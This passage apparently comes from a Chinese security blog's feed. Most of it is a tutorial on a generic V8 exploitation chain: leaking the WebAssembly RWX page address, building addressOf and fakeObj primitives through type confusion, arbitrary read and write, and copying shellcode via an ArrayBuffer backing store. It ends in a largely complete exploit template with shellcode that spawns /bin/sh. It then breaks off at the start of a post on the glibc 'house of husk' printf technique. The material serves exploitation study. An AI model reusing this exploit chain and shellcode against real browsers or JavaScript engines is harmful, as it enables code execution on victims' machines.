class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br>%<span class="hljs-title class_">DebugPrint</span>(f);<br>%<span class="hljs-title class_">DebugPrint</span>(wasmInstance);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>第二个断点时vmmap一下有一段rwx的内存</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/rwx.png" class title="rwx"><p>变量f（函数对象）的相关信息：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/f.png" class title="f"><p>经调试我们可以发现f.shared_info.data.instance&#x3D;&amp;wasmInstance（先不纠结这些属性到底是啥）<br>shared_info：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/shared_info.png" class title="shared_info"><p>data：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/data.png" class title="data"><p>wasmInstance：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/wasminstance.png" class title="wasminstance"><p>instance：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/instance.png" class title="instance"><p>可见rwx的地址写在instance+0x68的位置，我们要把shellcode写在这</p><h1 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h1><h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><p>test.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">a = [<span class="hljs-number">2.1</span>];<br>b = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br>c = [b];<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">DebugPrint</span>(b);<br>%<span class="hljs-title class_">DebugPrint</span>(c);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>首先来看a的内存布局：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/a.png" class title="a"><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/aa.png" class title="aa"><ul><li><p>0x142508049970-0x142508049980的部分是a的结构体</p></li><li><p>V8将最后一位置1表示指针，置0表示SMI当前版本的V8对地址进行了压缩，因为高32bit的地址值是一样的</p></li><li><p>所以a的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">|<span class="hljs-number">32</span> bit <span class="hljs-built_in">map</span> addr|<span class="hljs-number">32</span> bit properties addr|<span class="hljs-number">32</span> bit elements addr|<span class="hljs-number">32</span> bit length|<br></code></pre></td></tr></table></figure><p>elements结构内存布局如下：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/elements.png" class title="elements"></li><li><p>0x142508049960-0x142508049970的部分是elements结构</p></li><li><p>elements的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">|<span class="hljs-number">32</span> bit <span class="hljs-built_in">map</span> addr|<span class="hljs-number">32</span> bit length|value|<br></code></pre></td></tr></table></figure></li></ul><p>发现elements结构之后是紧接着就是a的结构，如果让elements溢出我们就能控制a的map和length结构<br>b的内存：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/b.png" class title="b"><p>c的内存：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/c.png" class title="c"><p>c的内存和a的内存分布基本一致</p><h2 id="任意变量地址读"><a href="#任意变量地址读" class="headerlink" title="任意变量地址读"></a>任意变量地址读</h2><p>JSArray用map结构来区分储存的数据类型（elements kind），如果我们将c的map地址改成a的，那么执行c[0]时就会将b的地址当成浮点数来解析（类型混淆），可以用来泄露变量地址，步骤如下：</p><ul><li>将c[0]的值设置为想要获取地址的变量，比如a</li><li>通过漏洞将c的map地址改成a的</li><li>读取c[0]的值，该值为a的低32bit地址<br>上述步骤可被封装为addressOf函数</li></ul><h2 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h2><p>同理我们也可以把浮点型数组变成对象型数组，步骤如下：</p><ul><li>将a[0]的值设为构造的对象地址+1</li><li>通过漏洞将a的map地址修改成c的</li><li>获取a[0]的值<br>这个过程可以被封装成fakeObj函数</li></ul><h2 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h2><p>构造这样一个变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[<br>double_array_map,<br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br></code></pre></td></tr></table></figure><p>变量结构如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(elements)<br>|<span class="hljs-number">32</span> bit map addr|<span class="hljs-number">32</span> bit length|<span class="hljs-number">64</span> bit double_array_map|<span class="hljs-number">64</span> bit <span class="hljs-number">0x4141414141414141n</span>|<br>(fake_array)<br>|<span class="hljs-number">32</span> bit map addr|<span class="hljs-number">32</span> bit properties addr|<span class="hljs-number">32</span> bit elements|<span class="hljs-number">32</span> bit length|<br></code></pre></td></tr></table></figure><p>可以用addressOf获取fake_array地址，-0x10得到fake_object地址（用double_array_map伪造map和properties，用itof(0x4141414141414141)伪造elements和length），然后使用fakeObj函数将浮点数组伪造成对象数组<br>以上过程可以打包成任意读函数read64：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[double_array_map,<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64_addr</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br>    <span class="hljs-keyword">var</span> fake_object_addr=fake_array_addr-<span class="hljs-number">0x10n</span>;<br>    <span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObject</span>(fake_object_addr);<br>    fake_array[<span class="hljs-number">1</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">8n</span>+<span class="hljs-number">1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h2><p>同理也能构造任意写函数write64：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[double_array_map,<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64_addr</span>(<span class="hljs-params">addr,data</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br>    <span class="hljs-keyword">var</span> fake_object_addr=fake_array_addr-<span class="hljs-number">0x10n</span>;<br>    <span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObject</span>(fake_object_addr);<br>    fake_array[<span class="hljs-number">1</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">8n</span>+<span class="hljs-number">1n</span>);<br>    fake_object[<span class="hljs-number">0</span>]=data;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p>但上述任意写没法把shellcode写入rwx区域，因为写入的地址&#x3D;实际地址-0x8+0x1，还需要伪造64bit的map和length，但需要写入shellcode的地址是rwx地址段的起始位置，所以我们无法伪造map和length（我的理解是正常的elements结构有map和length且正常改写需要合法的这两个结构），需要另辟蹊径<br>测试代码test.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>data_view.<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2.0</span>, <span class="hljs-literal">true</span>);<br><br>%<span class="hljs-title class_">DebugPrint</span>(data_buf);<br>%<span class="hljs-title class_">DebugPrint</span>(data_view);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>data_buf变量的结构如下：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/buf.png" class title="buf"><p>再看看backing_store字段的值：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/backstore.png" class title="backstore"><p>double型的2.0的十六进制表示就是0x4000000000000000，没有map和length，我们可以利用此类型将shellcode写入rwx内存<br>看看data_buf的内存布局：</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/bufbuf.png" class title="bufbuf"><p>backing_store字段在data_buf+0x1c<br>将上述步骤封装成copy_shellcode_to_rwx函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x18n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类型混淆类漏洞模板"><a href="#类型混淆类漏洞模板" class="headerlink" title="类型混淆类漏洞模板"></a>类型混淆类漏洞模板</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><span class="hljs-keyword">var</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><br><span class="hljs-comment">//32bit整型和64bit浮点类型转化</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">d2u</span>(<span class="hljs-params">v</span>) &#123;<br>  f64[<span class="hljs-number">0</span>] = v;<br>  <span class="hljs-keyword">return</span> u32;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u2d</span>(<span class="hljs-params">lo, hi</span>) &#123;<br>  u32[<span class="hljs-number">0</span>] = lo;<br>  u32[<span class="hljs-number">1</span>] = hi;<br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">//64bit整型和64bit浮点类型转化</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>    <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    ?<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<br>&#123;<br>    ?<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, data</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    fake_object[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x18n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">var</span> double_array = [<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span> : <span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array = [obj];<br><span class="hljs-keyword">var</span> array_map = ?;<br><span class="hljs-keyword">var</span> obj_map = ?;<br><br><span class="hljs-keyword">var</span> fake_array = [<br>  array_map,<br>  <span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br><br>fake_array_addr = <span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr = fake_array_addr - <span class="hljs-number">0x10n</span>;<br><span class="hljs-keyword">var</span> fake_object = <span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><span class="hljs-keyword">var</span> wasm_instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">read64</span>(wasm_instance_addr + <span class="hljs-number">0x68n</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode = [<br>  <span class="hljs-number">0x2fbb485299583b6an</span>,<br>  <span class="hljs-number">0x5368732f6e69622fn</span>,<br>  <span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);<br><span class="hljs-title function_">f</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of husk</title>
    <link href="/2023/03/03/house-of-husk/"/>
    <url>/2023/03/03/house-of-husk/</url>
    
    <content type="html"><![CDATA[<p>house of kiwi &amp; pig &amp; emma &amp; apple不打算写了^(*￣(oo)￣)^，感觉别的师傅已经写的很详细了写不出啥新东西，husk感觉还可以盘一下所以写一下</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>house of husk主要是利用了printf的一个调用链<br>看别的师傅的讲解都是从__register_printf_function函数开始的，但本机实测并没有调用这个函数，所以我打算从printf的流程开始捋一遍    </p><h2 id="printf流程"><a href="#printf流程" class="headerlink" title="printf流程"></a>printf流程</h2><p>调用链如下：<br>printf调用__vfprintf_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.36\stdio-common\printf.c</span><br><br><span class="hljs-type">int</span><br>__printf (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)<br>&#123;<br>  va_list arg;<br>  <span class="hljs-type">int</span> done;<br><br>  va_start (arg, format);<br>  done = __vfprintf_internal (<span class="hljs-built_in">stdout</span>, format, arg, <span 